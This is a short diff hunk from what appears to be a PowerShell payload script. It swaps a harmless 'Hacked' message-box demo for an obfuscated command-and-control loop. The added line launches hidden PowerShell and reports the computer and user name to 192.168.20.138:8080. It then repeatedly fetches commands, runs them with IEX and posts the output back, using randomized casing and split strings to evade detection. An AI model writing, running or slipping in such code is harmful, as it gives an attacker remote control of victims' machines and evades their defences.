@@ -37,7 +37,7 @@
 	variable and it will still run.
 #>  
 
-$code = "Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hacked')"
+$code = "S'Tart-'PROcEsS $PSHOME\powershell.exe -ARGUmentlIsT {$4a85c7="None";$1998=$('8900' -RepLaCE '[8(9|\?)(0|\?)]{3}[(0|\?)]{1}','192.168.20.138:8080');$ddb24='7fe580-def9a8-c'+'9c'+'e'+'8'+'1';$3ba56c='h'+'ttp:'+'/'+'/';$110f=i'RM' -UsEbaSICpArsinG -UrI $3ba56c$1998/7fe580/$env:COmpUtErnAME/$env:UserNAMe -heADeRS @{"Authorization"=$ddb24};for (;;){$b6a98c=(i'RM' -UsEbaSICpArsinG -UrI $3ba56c$1998/def9a8 -heADeRS @{"Authorization"=$ddb24});if ($b6a98c -ne ('None')) {$df923=i'EX' $b6a98c -ErrORacTion St'Op' -ErRoRVariABLE 0c2c;$df923=oUT-S'TrIn'G -INpuTobJeCT $df923;$332b=i'RM' -UrI $3ba56c$1998/c9ce81 -mEtHOD P'OS'T -heADeRS @{"Authorization"=$ddb24} -Body ([SySTeM.tExT.eNCodINg]::uTF8.GetBYteS($0c2c+$df923) -JoiN ' ')} sLe'ep' 0.8}} -wINdOWstYlE HiD'dE'N"
 
 ############################################################################################################################################################
 
